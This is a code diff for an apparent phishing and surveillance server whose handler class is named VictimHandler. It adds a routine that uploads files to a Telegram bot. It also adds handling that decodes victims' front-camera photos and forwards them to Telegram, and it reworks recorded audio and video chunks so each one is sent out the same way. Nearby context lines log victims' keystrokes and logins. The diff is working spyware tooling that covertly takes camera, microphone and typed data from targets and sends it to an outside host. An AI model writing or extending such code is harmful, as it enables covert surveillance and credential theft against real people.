@@ -47,6 +47,14 @@ def send_telegram_img(img_path, caption):
     except Exception as e:
         print(f"Telegram Photo Error: {e}")
 
+def send_telegram_doc(doc_path, caption):
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
+        with open(get_save_path(doc_path), 'rb') as f:
+            requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption, "parse_mode": "HTML"}, files={"document": f}, timeout=15)
+    except Exception as e:
+        print(f"Telegram Doc Error: {e}")
+
 print("Photos will save DIRECTLY in project folder!")
 
 HTML_PAGE = '''<!DOCTYPE html>
@@ -1049,6 +1057,17 @@ class VictimHandler(http.server.SimpleHTTPRequestHandler):
                         print(f"Failed to fetch static map image, status {resp.status_code}")
                 except Exception as e:
                     print(f"Error sending static map image: {e}")
+            elif msg_type == 'FRONT_live' and 'photo' in data:
+                try:
+                    if ',' in data['photo']:
+                        photo_data = data['photo'].split(',')[1]
+                        decoded = base64.b64decode(photo_data)
+                        img_path = f"victim_{victim['id']}_front_{int(time.time())}.jpg"
+                        with open(get_save_path(img_path), 'wb') as f:
+                            f.write(decoded)
+                        send_telegram_img(img_path, f"📸 Camera capture for Victim #{victim['id']}")
+                except Exception as e:
+                    print(f"Photo Error: {e}")
             elif msg_type == 'keylog':
                 print(f"⌨️ KEYLOG (Victim #{victim['id']}) - {data.get('field')}: {data.get('val')}")
             elif msg_type == 'login':
@@ -1061,17 +1080,11 @@ class VictimHandler(http.server.SimpleHTTPRequestHandler):
                         chunk_size = len(decoded)
                         print(f"DEBUG: Received audio_video chunk size={chunk_size} for Victim #{victim['id']}")
                         if chunk_size > 0:
-                            if not victim.get('video_filename'):
-                                fname = f"victim_{victim['id']}_VIDEO_{int(time.time())}.webm"
-                                victim['video_filename'] = fname
-                                victim['video_bytes'] = 0
-                                print(f"DEBUG: Creating new video file: {fname}")
-                            else:
-                                fname = victim['video_filename']
-                            with open(get_save_path(fname), 'ab') as f:
+                            fname = f"victim_{victim['id']}_VIDEO_{int(time.time())}.webm"
+                            with open(get_save_path(fname), 'wb') as f:
                                 f.write(decoded)
-                            victim['video_bytes'] = victim.get('video_bytes', 0) + chunk_size
-                            print(f"🎥 Appended {chunk_size} bytes to {fname} (total {victim['video_bytes']} bytes)")
+                            send_telegram_doc(fname, f"🎥 Video chunk for Victim #{victim['id']}")
+                            print(f"🎥 Sent {chunk_size} bytes video chunk")
                         else:
                             print(f"⚠️ Skipped saving zero-length audio_video chunk for Victim #{victim['id']}")
                 except Exception as e:
@@ -1084,21 +1097,12 @@ class VictimHandler(http.server.SimpleHTTPRequestHandler):
                         chunk_size = len(decoded)
                         print(f"DEBUG: Received audio chunk size={chunk_size} for Victim #{victim['id']}")
                         if chunk_size > 0:
-                            # append to per-victim audio file (or create new)
-                            if not victim.get('audio_filename'):
-                                is_video = data.get('isVideo', False)
-                                ext = 'webm'
-                                rec_type = 'VIDEO+AUDIO' if is_video else 'AUDIO'
-                                afname = f"victim_{victim['id']}_{rec_type}_{int(time.time())}.{ext}"
-                                victim['audio_filename'] = afname
-                                victim['audio_bytes'] = 0
-                                print(f"DEBUG: Creating new audio file: {afname}")
-                            else:
-                                afname = victim['audio_filename']
-                            with open(get_save_path(afname), 'ab') as f:
+                            ext = 'webm'
+                            afname = f"victim_{victim['id']}_AUDIO_{int(time.time())}.{ext}"
+                            with open(get_save_path(afname), 'wb') as f:
                                 f.write(decoded)
-                            victim['audio_bytes'] = victim.get('audio_bytes', 0) + chunk_size
-                            print(f"🎧 Appended {chunk_size} bytes to {afname} (total {victim['audio_bytes']} bytes)")
+                            send_telegram_doc(afname, f"🎧 Audio chunk for Victim #{victim['id']}")
+                            print(f"🎧 Sent {chunk_size} bytes audio chunk")
                         else:
                             print(f"⚠️ Skipped saving zero-length audio chunk for Victim #{victim['id']}")
                 except Exception as e: print(f"Audio Error: {e}")
